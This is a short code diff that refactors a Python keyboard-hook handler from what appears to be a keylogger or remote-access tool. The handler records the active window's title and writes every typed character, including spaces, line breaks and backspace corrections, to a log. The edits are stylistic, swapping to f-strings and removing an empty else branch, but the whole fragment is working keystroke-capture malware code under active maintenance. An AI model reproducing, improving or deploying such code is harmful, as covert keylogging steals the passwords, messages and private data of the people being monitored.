@@ -46,7 +46,7 @@ def _event(event):
     try:
         if event.WindowName != window:
             window = event.WindowName
-            logs.write("\n[{}]\n".format(window))
+            logs.write(f"\n[{window}]\n")
         if event.Ascii > 32 and event.Ascii < 127:
             logs.write(chr(event.Ascii))
         elif event.Ascii == 32:
@@ -56,10 +56,8 @@ def _event(event):
         elif event.Ascii == 8:
             logs.seek(-1, 1)
             logs.truncate()
-        else:
-            pass
     except Exception as e:
-        util.log('{} error: {}'.format(event.__name__, str(e)))
+        util.log(f'{event.__name__} error: {str(e)}')
     return True
 
 def _run():
